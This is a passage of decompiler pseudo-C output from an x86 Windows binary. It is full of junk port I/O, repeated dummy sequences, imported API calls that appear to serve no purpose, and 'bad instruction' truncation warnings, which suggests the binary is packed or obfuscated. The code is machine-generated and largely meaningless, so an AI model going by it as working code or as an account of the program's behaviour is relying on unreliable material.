*(piVar18 + 0x4e);\n    uVar9 = in(0x9e);\n    uVar3 = uVar9 | 0x48;\n    if (uVar3 < '\\0') {\ncode_r0x004041d1:\n        *(piVar7 + -0x1b9c56e6) = *(piVar7 + -0x1b9c56e6) + -0x2444899f;\n        uStack102 = 0x4cf;\n        cStack22 = cStack178 + 'M';\n        uStack29 = uStack189 ^ 0xbe;\n        uStack144 = 10;\n        uStack143 = 0;\n        uStack141 = 0;\n        piStack40 = uStack188;\n        if ((uStack148 & 1) == 0) {\ncode_r0x00404d18:\n            uVar17 = CONCAT11(uStack176, uStack177) ^ 0xa728;\n            uStack21 = uVar17;\n            uStack20 = uVar17 >> 8;\n            piVar22 = CONCAT13(uStack48, uStack52._1_3_) + (0xef7b4fba < CONCAT13(uStack52, uStack56._1_3_)) ^\n                      CONCAT13(puStack112._0_1_, uStack116._1_3_);\n            uVar5 = CONCAT13(uStack184, uStack188._1_3_) | 0x7a9f6f4;\n            piVar23 = CONCAT13(uStack52, uStack56._1_3_) + 0x1084b045 ^ CONCAT13(uStack116, uStack120._1_3_) | piVar22;\n            piVar18 = CONCAT13(uStack180, CONCAT21(uStack182, uStack183));\n            uStack32 = uStack180;\n            piStack40 = piStack40 & 0xff | uVar5 << 8;\n            uStack36._0_1_ = uVar5 >> 0x18;\n            uStack36 = CONCAT31(CONCAT21(uStack182, uStack183), uStack36);\n            uStack207 = SUB41(piVar23, 0);\n            uStack206 = piVar23 >> 8;\n            uStack205 = piVar23 >> 0x10;\n            uStack204 = piVar23 >> 0x18;\n            piVar14 = piVar22;\n            if (piVar23 != NULL) {\n                cVar26 = '\\0';\n                uStack28 = uStack188 | 0x37;\n                uStack209 = 0x40;\n                cStack208 = '\\0';\n                (*_sym.imp.USER32.dll_GetWindowLongA)();\n                *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_14) - cVar26;\n                piVar7 = piVar23 + 1;\n                uStack209 = in_CS;\n                cStack208 = in_CS >> 8;\n                in_CS = 0xfd21;\n                uVar5 = func_0x04bc038a();\n                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                piVar14 = uVar5 & 0xffff0000 | uVar17;\n                Var16 = extraout_ECX_05 >> 8;\n                *piVar14 = *piVar14 << 0x1b;\n                out(piVar18[1], uVar17);\n                *piVar7 = 0;\n                puVar20 = piVar18 + 2 ^ *(piVar18 + 0x4e);\n                uVar10 = in(0x9e);\n                if (-1 < (uVar10 | 0x48)) goto code_r0x00404249;\n                *(piVar23 + -0x1b9c56e2) = *(piVar23 + -0x1b9c56e2) + -0x2444899f;\n                uStack29 = 7;\n                goto code_r0x00404304;\n            }\ncode_r0x00404cda:\n            uStack28 = 0xe;\n            uStack27 = 0x80;\n            uStack26 = 0x31;\n            uStack25 = 0xb3;\n            uStack144 = 10;\n            uStack143 = 0;\n            uStack141 = 0;\n            uStack29 = uStack189 ^ 0xff;\n            if (iStack100 == CONCAT13(uStack61, CONCAT21(uStack63, uStack64)) + -0x39b8ecaf) {\n                if (iStack108 != 0x7061cf7c) {\ncode_r0x0040403f:\n                    iVar6 = CONCAT11(uStack177, cStack178) * -0x26cc;\n                    cVar26 = iVar6 != iVar6;\n                    cStack22 = iVar6;\n                    uStack21 = iVar6 >> 8;\n                    uStack209 = 0;\n                    (*_sym.imp.KERNEL32.dll_FindFirstVolumeW)();\n                    *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_21) - cVar26;\n                    piVar7 = piVar23 + 1;\n                    uVar29 = in_CS;\n                    uStack209 = in_CS >> 8;\n                    in_CS = 0xfd21;\n                    uVar5 = func_0x04bc038a(uVar29);\n                    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                    piVar23 = uVar5 & 0xffff0000 | uVar17;\n                    *piVar23 = *piVar23 << 0x1b;\n                    out(piVar18[1], uVar17);\n                    *piVar7 = 0;\n                    puVar20 = piVar18 + 2 ^ *(piVar18 + 0x4e);\n                    piVar22 = piVar14;\ncode_r0x00404768:\n                    uVar10 = in(0x9e);\n                    uVar3 = uVar10 | 0x48;\n                    bVar28 = uVar3 == 0;\n                    if (-1 < uVar3) goto code_r0x00404723;\n                    *(piVar7 + -0x1b9c56e6) = *(piVar7 + -0x1b9c56e6) + -0x2444899f;\n                    if (uVar3 < -0x7d) {\n                        uStack207 = in_CS;\n                        uStack206 = in_CS >> 8;\n                        goto code_r0x00404793;\n                    }\n                    cVar26 = false;\n                    if (uVar3 != 0) goto code_r0x00404c42;\ncode_r0x00404784:\n                    uStack209 = 0;\n                    (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n                    *(piVar7 + puVar20) = (*(piVar7 + puVar20) - extraout_CL_22) - cVar26;\n                    piVar7 = piVar7 + 1;\n                    puVar20 = puVar20 + 1;\ncode_r0x00404793:\n                    while( true ) {\n                        uStack209 = in_CS;\n                        cStack208 = in_CS >> 8;\n                        in_CS = 0xfd21;\n                        uVar5 = func_0x04bc038a();\n                        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                        uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                        piVar18 = uVar5 & 0xffff0000 | uVar17;\n                        *piVar18 = *piVar18 << 0x1b;\n                        out(*puVar20, uVar17);\n                        *piVar7 = 0;\n                        puVar20 = puVar20 + 1 ^ *(puVar20 + 0x4a);\n                        uVar10 = in(0x9e);\n                        uVar3 = uVar10 | 0x48;\n                        if (uVar3 < '\\0') break;\n                        if (uVar3 != 0) goto code_r0x00404768;\n                    }\n                    *(piVar7 + -0x1b9c56e6) = *(piVar7 + -0x1b9c56e6) + -0x2444899f;\n                    piVar7 = piVar7 + 1;\n                    in(uVar17);\n                    uStack21 = 8;\n                    piVar14 = piVar22;\n                    uStack20 = extraout_CH_00;\n                    if (CONCAT13(uStack144, CONCAT12(uStack145, uStack147)) ==\n                        0x4c8b6618 - CONCAT13(uStack60, CONCAT12(uStack61, uStack63))) goto code_r0x00404044;\ncode_r0x00404d7e:\n                    cVar26 = '\\0';\n                    uStack28 = uStack188 | 0x78;\n                    uStack209 = 0x40;\n                    cStack208 = '\\0';\n                    (*_sym.imp.KERNEL32.dll_GetCommModemStatus)();\n                    *(piVar7 + puVar20) = (*(piVar7 + puVar20) - extraout_CL_29) - cVar26;\n                    piVar18 = piVar7 + 1;\n                    uStack209 = in_CS;\n                    cStack208 = in_CS >> 8;\n                    in_CS = 0xfd21;\n                    uVar5 = func_0x04bc038a();\n                    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                    piVar23 = uVar5 & 0xffff0000 | uVar17;\n                    *piVar23 = *piVar23 << 0x1b;\n                    out(puVar20[1], uVar17);\n                    *piVar18 = 0;\n                    puVar20 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n                    uVar5 = in(0x9e);\n                    uVar3 = uVar5 | 0x48;\n                    if (uVar3 < '\\0') {\n                        *(piVar7 + -0x1b9c56e2) = *(piVar7 + -0x1b9c56e2) + -0x2444899f;\n                        uVar5 = CONCAT13(uStack157, CONCAT21(uStack159, uStack160)) | 0x21298d5;\n                        uStack28 = uVar5;\n                        uStack27 = uVar5 >> 8;\n                        uStack26 = uVar5 >> 0x10;\n                        uStack25 = uVar5 >> 0x18;\n                        piVar14 = piVar22;\n                        piVar7 = piVar18;\n                        if (CONCAT31(extraout_ECX_16 >> 8, 8) != 0) goto code_r0x00404322;\ncode_r0x00404c42:\n                        cVar26 = '\\0';\n                        uStack209 = 0;\n                        (*_sym.imp.ADVAPI32.dll_LookupPrivilegeNameA)();\n                        *(piVar7 + puVar20) = (*(piVar7 + puVar20) - extraout_CL_28) - cVar26;\n                        piVar23 = piVar7 + 1;\n                        uVar29 = in_CS;\n                        uStack209 = in_CS >> 8;\n                        in_CS = 0xfd21;\n                        uVar5 = func_0x04bc038a(uVar29);\n                        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                        uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                        piVar14 = uVar5 & 0xffff0000 | uVar17;\n                        piVar15 = CONCAT31(extraout_ECX_15 >> 8, 8);\n                        *piVar14 = *piVar14 << 0x1b;\n                        out(puVar20[1], uVar17);\n                        *piVar23 = 0;\n                        uVar5 = in(0x9e);\n                        uVar3 = uVar5 | 0x48;\n                        pcVar11 = uVar5 | 0x48;\n                        if (-1 < uVar3) {\n                            *pcVar11 = *pcVar11 + uVar3;\n                            *(piVar22 + 0x240921) = *(piVar22 + 0x240921) + 8;\n                            *pcVar11 = *pcVar11 + uVar3;\n                            goto code_r0x00404bfb;\n                        }\n                        *(piVar7 + -0x1b9c56e2) = *(piVar7 + -0x1b9c56e2) + -0x2444899f;\n                        uStack207 = auStack203 >> 8;\n                        uStack206 = auStack203 >> 0x10;\n                        uStack205 = auStack203 >> 0x18;\n                        puVar20 = CONCAT13(uStack60, CONCAT12(uStack61, uStack63)) ^ 0x39b8ecaf;\n                        piVar14 = CONCAT13(uStack156, CONCAT12(uStack157, uStack159)) ^ 0x7368da5d;\n                        uStack143 = 5;\n                        uStack141 = 0;\n                        uStack140 = 0;\n                        iVar4 = 0x121c - CONCAT11(uStack176, uStack177);\n                        uStack21 = iVar4;\n                        uStack20 = iVar4 >> 8;\n                        if ((CONCAT12(uStack145, uStack147) & 1) == puVar20) {\n                            cVar26 = '\\0';\n                            uVar5 = CONCAT13(uStack156, CONCAT12(uStack157, uStack159)) | 0x784b0d74;\n                            uStack27 = uVar5;\n                            uStack26 = uVar5 >> 8;\n                            uStack25 = uVar5 >> 0x10;\n                            uStack24 = uVar5 >> 0x18;\n                            uStack209 = 0x40;\n                            cStack208 = '\\0';\n                            (*_sym.imp.USER32.dll_GetUpdateRgn)();\n                            iVar6 = extraout_ECX_09;\n                            do {\n                                *(piVar14 + puVar20) = (*(piVar14 + puVar20) - iVar6) - cVar26;\n                                uVar29 = in_CS;\n                                in_CS = 0xfd21;\n                                uVar5 = func_0x04bc038a(uVar29);\n                                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                                uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                                piVar18 = uVar5 & 0xffff0000 | uVar17;\n                                Var16 = extraout_ECX_10 >> 8;\n                                *piVar18 = *piVar18 << 0x1b;\n                                out(puVar20[1], uVar17);\n                                *(piVar14 + 1) = 0;\n                                puVar20 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n                                piVar7 = piVar14 + 1;\n                                while( true ) {\n                                    piVar14 = piVar7;\n                                    iVar6 = CONCAT31(Var16, 8);\n                                    uVar5 = in(0x9e);\n                                    cVar26 = '\\0';\n                                    uVar3 = uVar5 | 0x48;\n                                    pcVar11 = uVar5 | 0x48;\n                                    if (-1 < uVar3) break;\n                                    *(piVar14 + -0x1b9c56e6) = *(piVar14 + -0x1b9c56e6) + -0x2444899f;\n                                    *pcVar11 = *pcVar11 + uVar3;\n                                    piVar23 = piVar18 + -0x17b07f8a;\n                                    cVar26 = *piVar23;\n                                    cVar27 = pcVar11;\n                                    *piVar23 = *piVar23 + cVar27;\n                                    pcVar11 = pcVar11;\n                                    if (SCARRY1(cVar26, cVar27)) {\n                                        *(pcVar11 + piVar18 * 4) = in_FS;\n                                        *pcVar11 = *pcVar11 + cVar27;\n                                        *(iVar6 + 0x471351c1) = *(iVar6 + 0x471351c1) + cVar27;\n    // WARNING: Bad instruction - Truncating control flow here\n                                        halt_baddata();\n                                    }\n                                    uVar3 = piVar22;\n                                    piVar22 = piVar22 & 0xffff0000 |\n                                              CONCAT11((piVar22 >> 8) * '\\x02', uVar3) & 0xffffff00 | uVar3 >> 1;\n                                    *(piVar14 + puVar20) = (*(piVar14 + puVar20) - 8) - (uVar3 & 1);\n                                    piVar7 = piVar14 + 1;\n                                    puVar20 = puVar20 + 1;\n                                    do {\n                                        uVar29 = in_CS;\n                                        in_CS = 0xfd21;\n                                        uVar5 = func_0x04bc038a(uVar29);\n                                        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                                        uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                                        piVar18 = uVar5 & 0xffff0000 | uVar17;\n                                        Var16 = extraout_ECX_11 >> 8;\n                                        *piVar18 = *piVar18 << 0x1b;\n                                        out(*puVar20, uVar17);\n                                        *piVar7 = 0;\n                                        puVar20 = puVar20 + 1 ^ *(puVar20 + 0x4a);\n                                        uVar5 = in(0x9e);\n                                        uVar3 = uVar5 | 0x48;\n                                        if (uVar3 < '\\0') {\n                                            *(piVar14 + -0x1b9c56e2) = *(piVar14 + -0x1b9c56e2) + -0x2444899f;\n                                            uStack28 = uVar5 & 0x30;\n                                            uVar5 = uVar5 & 0xffffff30;\n                                            uStack27 = uVar5 >> 8;\n                                            uStack26 = uVar5 >> 0x10;\n                                            uStack25 = uVar5 >> 0x18;\n                                            uVar9 = CONCAT13(uStack61, CONCAT21(uStack63, uStack64)) + 0xc6471351;\n                                            uVar5 = CONCAT13(uStack145, CONCAT21(uStack147, uStack148));\n                                            uStack29 = uStack189 * uStack189;\n                                            cVar26 = uVar5 < uVar9;\n                                            if (uVar5 != uVar9) goto code_r0x00404784;\n                                            uStack209 = 0;\n                                            (*_sym.imp.GDI32.dll_GetROP2)();\n                                            *(piVar7 + puVar20) = (*(piVar7 + puVar20) - extraout_CL_26) - cVar26;\n                                            piVar23 = piVar14 + 2;\n                                            uVar29 = in_CS;\n                                            uStack209 = in_CS >> 8;\n                                            in_CS = 0xfd21;\n                                            uVar5 = func_0x04bc038a(uVar29);\n                                            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                                            uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                                            piVar18 = uVar5 & 0xffff0000 | uVar17;\n                                            piVar15 = CONCAT31(extraout_ECX_13 >> 8, 8);\n                                            *piVar18 = *piVar18 << 0x1b;\n                                            out(puVar20[1], uVar17);\n                                            *piVar23 = 0;\n                                            piVar18 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n                                            uVar5 = in(0x9e);\n                                            uVar3 = uVar5 | 0x48;\n                                            pcVar11 = uVar5 | 0x48;\n                                            if (uVar3 < '\\0') {\n                                                *(piVar14 + -0x1b9c56de) = *(piVar14 + -0x1b9c56de) + -0x2444899f;\n                                                iVar6 = CONCAT22(uStack155, CONCAT11(uStack156, uStack157)) +\n                                                        -0x71b05a17;\n                                                uStack25 = iVar6;\n                                                uStack24 = iVar6 >> 8;\n                                                uStack23 = iVar6 >> 0x10;\n                                                cStack22 = iVar6 >> 0x18;\n                                                uStack141 = 0xfd;\n                                                uStack140 = 0xff;\n                                                uStack139 = 0xffff;\n    // WARNING: Bad instruction - Truncating control flow here\n                                                cVar26 = '\\0';\n                                                uStack209 = 0x12;\n                                                cStack208 = ':';\n                                                uStack207 = 0x40;\n                                                uStack206 = 0;\n                                                (*_sym.imp.USER32.dll_FlashWindowEx)();\n                                                *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL) - cVar26;\n                                                piVar23 = piVar14 + 3;\n                                                uStack207 = in_CS;\n                                                uStack206 = in_CS >> 8;\n                                                in_CS = 0xfd21;\n                                                uStack209 = 0x40;\n                                                cStack208 = '\\0';\n                                                uVar5 = func_0x04bc038a();\n                                                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                                                uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f\n                                                ;\n                                                piVar7 = uVar5 & 0xffff0000 | uVar17;\n                                                *piVar7 = *piVar7 << 0x1b;\n                                                piVar14 = piVar18 + 2;\n                                                out(piVar18[1], uVar17);\n                                                goto code_r0x00403a2b;\n                                            }\n                                            *pcVar11 = *pcVar11 + uVar3;\n                                            *(piVar15 + 0x2a0923) = *(piVar15 + 0x2a0923) + '\\b';\n                                            *pcVar11 = *pcVar11 + uVar3;\n                                            goto code_r0x00404b3b;\n                                        }\n                                    } while (uVar3 == 0);\n                                }\n                                if (-1 < uVar3) {\n                                    *piVar14 = *piVar14 | 8;\n    // WARNING: Bad instruction - Truncating control flow here\n                                    halt_baddata();\n                                }\n                            } while( true );\n                        }\n                        goto code_r0x0040415f;\n                    }\n                    *(uVar5 | 0x48) = *(uVar5 | 0x48) + uVar3;\n                    goto code_r0x00404d18;\n                }\ncode_r0x004043f1:\n                uStack29 = 0x29;\n                uStack144 = 1;\n                uStack143 = 0;\n                uStack141 = 0;\n                iVar6 = CONCAT13(uStack157, CONCAT21(uStack159, uStack160)) + 0x55a0eaef;\n                uStack28 = iVar6;\n                uStack27 = iVar6 >> 8;\n                uStack26 = iVar6 >> 0x10;\n                uStack25 = iVar6 >> 0x18;\n                cVar26 = false;\n                if ((CONCAT13(uStack145, CONCAT21(uStack147, uStack148)) &\n                    CONCAT13(uStack61, CONCAT21(uStack63, uStack64)) + 0xc6471352U) == 0) {\n                    while( true ) {\n                        uStack36 = NULL;\n                        piStack40 = 0x40000abc;\n                        uStack209 = 0;\n                        (*0x406c84)();\n                        *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_06) - cVar26;\n                        piVar22 = piVar23 + 1;\n                        uVar29 = in_CS;\n                        uStack209 = in_CS >> 8;\n                        in_CS = 0xfd21;\n                        uVar5 = func_0x04bc038a(uVar29);\n                        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                        uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                        piVar7 = uVar5 & 0xffff0000 | uVar17;\n                        *piVar7 = *piVar7 << 0x1b;\n                        out(piVar18[1], uVar17);\n                        *piVar22 = 0;\n                        piVar18 = piVar18 + 2 ^ *(piVar18 + 0x4e);\n                        uVar5 = in(0x9e);\n                        uVar3 = uVar5 | 0x48;\n                        puVar8 = uVar5 | 0x48;\n                        if (uVar3 < '\\0') break;\n                        *puVar8 = *puVar8 | uVar3;\n                        cVar26 = CARRY1(*puVar8, uVar3);\n                        *puVar8 = *puVar8 + uVar3;\n                        piVar23 = piVar22;\n                    }\n                    *(piVar23 + -0x1b9c56e2) = *(piVar23 + -0x1b9c56e2) + -0x2444899f;\n                    pcVar11 = &cStack208 & 0xffffffa6;\n                    cVar26 = pcVar11;\n                    *pcVar11 = *pcVar11 + cVar26;\n                    *(piVar18 + 0x2b) = *(piVar18 + 0x2b) + (pcVar11 >> 8);\n                    *piVar18 = in_FS;\n                    *pcVar11 = *pcVar11 + cVar26;\n                    *pcVar11 = *pcVar11 + cVar26;\n                    *piVar22 = *piVar22 + cVar26;\n                    *(piVar18 + -0x7f) = *(piVar18 + -0x7f) & puVar8 + -1;\n                    return pcVar11;\n                }\n            }\n        }\n    }\n    else {\n        *(uVar9 | 0x48) = *(uVar9 | 0x48) + uVar3;\n        pcVar11 = (piVar18 + 2 ^ uVar5) - 0x75;\n        *pcVar11 = *pcVar11 + (uVar9 >> 8);\n    }\n    goto code_r0x0040415f;\ncode_r0x00404b3b:\n    iVar6 = (pcVar11 & 0xffffff14) * 2 + CARRY4(piVar15, piVar15);\n    uStack32 = iVar6 >> 0x18;\n    piStack40 = piStack40 & 0xff | piVar15 << 9;\n    uStack36._0_1_ = piVar15 * 2 >> 0x18;\n    uStack36 = CONCAT31(iVar6, uStack36);\n    if (0x60c2c10c < piVar18) goto code_r0x004043a5;\n    iVar4 = CONCAT11(uStack176, uStack177) + -0x714f;\n    uStack21 = iVar4;\n    uStack20 = iVar4 >> 8;\n    uStack27 = 0x60;\n    uStack26 = 0xf2;\n    uStack25 = 0xc1;\n    uStack24 = 0x6f;\n    cVar26 = uStack136 < uStack56 + 0xabU;\n    piVar14 = piVar22;\n    if (uStack136 != uStack56 + 0xabU) goto code_r0x00404cda;\ncode_r0x0040458f:\n    uStack209 = 0x40;\n    cStack208 = '\\0';\n    (*_sym.imp.USER32.dll_GetClipboardViewer)();\n    *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_18) - cVar26;\n    piVar7 = piVar23 + 1;\n    uStack209 = in_CS;\n    cStack208 = in_CS >> 8;\n    in_CS = 0xfd21;\n    uVar5 = func_0x04bc038a();\n    in_AF = 9 < (uVar5 & 0xf) | in_AF;\n    uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n    piVar14 = uVar5 & 0xffff0000 | uVar17;\n    *piVar14 = *piVar14 << 0x1b;\n    out(piVar18[1], uVar17);\n    *piVar7 = 0;\n    uVar9 = piVar18 + 2 ^ *(piVar18 + 0x4e);\n    uVar5 = in(0x9e);\n    uVar3 = uVar5 | 0x48;\n    pcVar11 = uVar5 | 0x48;\n    if (-1 < uVar3) {\ncode_r0x00404575:\n        uVar29 = in_CS;\n        uStack26 = uStack182 ^ 0xffff;\n        uStack25 = (uStack182 ^ 0xffff) >> 8;\n        cVar26 = '\\0';\n        if (pcVar11 == NULL) goto code_r0x00404954;\n        (*_sym.imp.GDI32.dll_GetDeviceCaps)();\n        *(piVar7 + uVar9) = (*(piVar7 + uVar9) - extraout_CL_19) - cVar26;\n        piVar18 = piVar7 + 1;\n        in_CS = 0xfd21;\n        uVar5 = func_0x04bc038a(uVar29);\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n        piVar23 = uVar5 & 0xffff0000 | uVar17;\n        piVar14 = CONCAT31(extraout_ECX_08 >> 8, 8);\n        *piVar23 = *piVar23 << 0x1b;\n        out(*(uVar9 + 4), uVar17);\n        *piVar18 = 0;\n        puVar20 = uVar9 + 8 ^ *(uVar9 + 0x4e);\n        uVar10 = in(0x9e);\n        if (-1 < (uVar10 | 0x48)) goto code_r0x0040460e;\n        *(piVar7 + -0x1b9c56e2) = *(piVar7 + -0x1b9c56e2) + -0x2444899f;\n        uStack29 = 0x70;\n        cStack22 = -0x7d;\n        uStack21 = 0x46;\n        piVar14 = piVar22;\n        if (CONCAT13(uStack145, CONCAT21(uStack147, uStack148)) != 0) goto code_r0x00404524;\ncode_r0x00404322:\n        cVar26 = '\\0';\n        uStack209 = 0;\n        (*_sym.imp.GDI32.dll_GetCurrentObject)();\n        *(piVar18 + puVar20) = (*(piVar18 + puVar20) - extraout_CL_15) - cVar26;\n        piVar7 = piVar18 + 1;\n        uVar29 = in_CS;\n        uStack209 = in_CS >> 8;\n        in_CS = 0xfd21;\n        uVar5 = func_0x04bc038a(uVar29);\n        in_AF = 9 < (uVar5 & 0xf) | in_AF;\n        uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n        piVar23 = uVar5 & 0xffff0000 | uVar17;\n        Var16 = extraout_ECX_06 >> 8;\n        *piVar23 = *piVar23 << 0x1b;\n        out(puVar20[1], uVar17);\n        *piVar7 = 0;\n        puVar20 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n        uVar5 = in(0x9e);\n        piVar22 = piVar14;\n        if (-1 < (uVar5 | 0x48)) {\ncode_r0x00404304:\n            cStack22 = cStack178;\n            uStack21 = uStack177;\n            if (CONCAT31(Var16, 8) == 0) {\n                cVar26 = 0x39b8ecad < CONCAT13(uStack61, CONCAT21(uStack63, uStack64));\n                uStack28 = 0x7f;\n                uStack27 = 0x46;\n                uStack26 = 200;\n                uStack25 = 0x5d;\n                uStack209 = 0;\n                (*_sym.imp.GDI32.dll_GetLogColorSpaceA)();\n                *(piVar7 + puVar20) = (*(piVar7 + puVar20) - extraout_CL_16) - cVar26;\n                piVar18 = piVar7 + 1;\n                uVar29 = in_CS;\n                uStack209 = in_CS >> 8;\n                in_CS = 0xfd21;\n                uVar5 = func_0x04bc038a(uVar29);\n                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                piVar23 = uVar5 & 0xffff0000 | uVar17;\n                *piVar23 = *piVar23 << 0x1b;\n                out(puVar20[1], uVar17);\n                *piVar18 = 0;\n                puVar20 = puVar20 + 2 ^ *(puVar20 + 0x4e);\n                uVar5 = in(0x9e);\n                if (-1 < (uVar5 | 0x48)) {\n                    return uVar5 | 0x48;\n                }\n                *(piVar7 + -0x1b9c56e2) = *(piVar7 + -0x1b9c56e2) + -0x2444899f;\n                piStack40 = uStack188 | 0x6360ef16;\n                uStack36 = CONCAT22(uStack182, CONCAT11(uStack183, uStack184));\n                uStack144 = 0xf6;\n                uStack143 = 0xffff;\n                uStack141 = 0xff;\n                if ((CONCAT31(extraout_ECX_07 >> 8, 8) & (uVar5 | 0x48) & 0xffffff3c) == 0) goto code_r0x00404524;\n                goto code_r0x0040415f;\n            }\n            goto code_r0x00404c42;\n        }\n        *(piVar18 + -0x1b9c56e2) = *(piVar18 + -0x1b9c56e2) + -0x2444899f;\n        uVar5 = uVar5 & 0xffffff30;\n        uStack27 = uVar5;\n        uStack26 = uVar5 >> 8;\n        uStack25 = uVar5 >> 0x10;\n        uStack24 = uVar5 >> 0x18;\n        puVar20 = CONCAT13(uStack180, CONCAT21(uStack182, uStack183));\n        piStack40 = piStack40 & 0xff | (uStack188 >> 8 & 0x73cbec) << 8;\n        uStack36._0_1_ = uStack184 & 0x3e;\n        uStack36 = uStack36;\n        uStack32 = 0;\n        if (CONCAT13(uStack144, CONCAT12(uStack145, uStack147)) == 0) {\n            while( true ) {\n                uStack28 = uStack188;\n                iVar6 = -CONCAT13(uStack52, uStack56._1_3_);\n                uVar5 = 0xbeec32bb < CONCAT13(uStack52, uStack56._1_3_);\n                uVar9 = -CONCAT13(uStack48, uStack52._1_3_);\n                cVar26 = CONCAT13(uStack48, uStack52._1_3_) != 0 || uVar9 < uVar5;\n                iVar21 = uVar9 - uVar5;\n                piVar14 = piVar14 & 0xffff0000 | CONCAT11(uStack176, uStack177);\n                uStack209 = 0x40;\n                cStack208 = '\\0';\n                (*_sym.imp.USER32.dll_GetQueueStatus)();\n                pcVar11 = iVar6 + -0x4113cd45 + iVar21 * 4;\n                *pcVar11 = (*pcVar11 - extraout_CL_23) - cVar26;\n                uStack209 = in_CS;\n                cStack208 = in_CS >> 8;\n                in_CS = 0xfd21;\n                uVar5 = func_0x04bc038a();\n                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                piVar18 = uVar5 & 0xffff0000 | uVar17;\n                *piVar18 = *piVar18 << 0x1b;\n                out(*(iVar21 + 4), uVar17);\n                *(iVar6 + -0x4113cd41) = 0;\n                uVar5 = in(0x9e);\n                uVar3 = uVar5 | 0x48;\n                pcVar11 = uVar5 | 0x48;\n                if (uVar3 < '\\0') break;\n                *pcVar11 = *pcVar11 + uVar3;\n                *(piVar14 + 0x270925) = *(piVar14 + 0x270925) + 8;\n                *pcVar11 = *pcVar11 + uVar3;\n            }\n            *(iVar6 + -0x5cb02427) = *(iVar6 + -0x5cb02427) + -0x2444899f;\n            pcVar12 = swi(1);\n            pcVar11 = (*pcVar12)();\n            return pcVar11;\n        }\ncode_r0x00404044:\n        cVar26 = uStack188 * uStack188 >> 8 != '\\0';\n        uStack28 = uStack188 * uStack188;\n        uStack209 = 0x40;\n        cStack208 = '\\0';\n        (*_sym.imp.ADVAPI32.dll_GetSidIdentifierAuthority)();\n        *(piVar7 + puVar20) = (*(piVar7 + puVar20) - extraout_CL_09) - cVar26;\n        piVar23 = piVar7 + 1;\n        puVar20 = puVar20 + 1;\n        while( true ) {\n            uStack209 = in_CS;\n            cStack208 = in_CS >> 8;\n            in_CS = 0xfd21;\n            uVar5 = func_0x04bc038a();\n            in_AF = 9 < (uVar5 & 0xf) | in_AF;\n            uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n            piVar22 = uVar5 & 0xffff0000 | uVar17;\n            *piVar22 = *piVar22 << 0x1b;\n            out(*puVar20, uVar17);\n            *piVar23 = 0;\n            piVar18 = puVar20 + 1 ^ *(puVar20 + 0x4a);\n            uVar5 = in(0x9e);\n            uVar3 = uVar5 | 0x48;\n            uVar5 = uVar5 | 0x48;\n            if (-1 < uVar3) break;\n            *(piVar23 + -0x1b9c56e6) = *(piVar23 + -0x1b9c56e6) + -0x2444899f;\n            cVar26 = 0xffbf8f57 < uVar5 || CARRY4(sym.imp.USER32.dll_GetDlgItemTextA + uVar5, uVar5 < 0x8b);\n            uStack209 = 0;\n            (*piVar22)();\n            *(piVar23 + piVar18) = (*(piVar23 + piVar18) - extraout_CL_10) - cVar26;\n            piVar18 = piVar18 + 1;\n            piVar7 = piVar23 + 1;\n            while( true ) {\n                piVar23 = piVar7;\n                uStack206 = in_CS;\n                uStack205 = in_CS >> 8;\n                in_CS = 0xfd21;\n                uStack209 = 0x40;\n                cStack208 = '@';\n                uStack207 = 0;\n                uVar5 = func_0x04bc038a();\n                in_AF = 9 < (uVar5 & 0xf) | in_AF;\n                uVar17 = CONCAT11((uVar5 >> 8) + in_AF, uVar5 + in_AF * '\\x06') & 0xff0f;\n                piVar22 = uVar5 & 0xffff0000 | uVar17;\n                *piVar22 = *piVar22 << 0x1b;\n                out(*piVar18, uVar17);\n                *piVar23 = 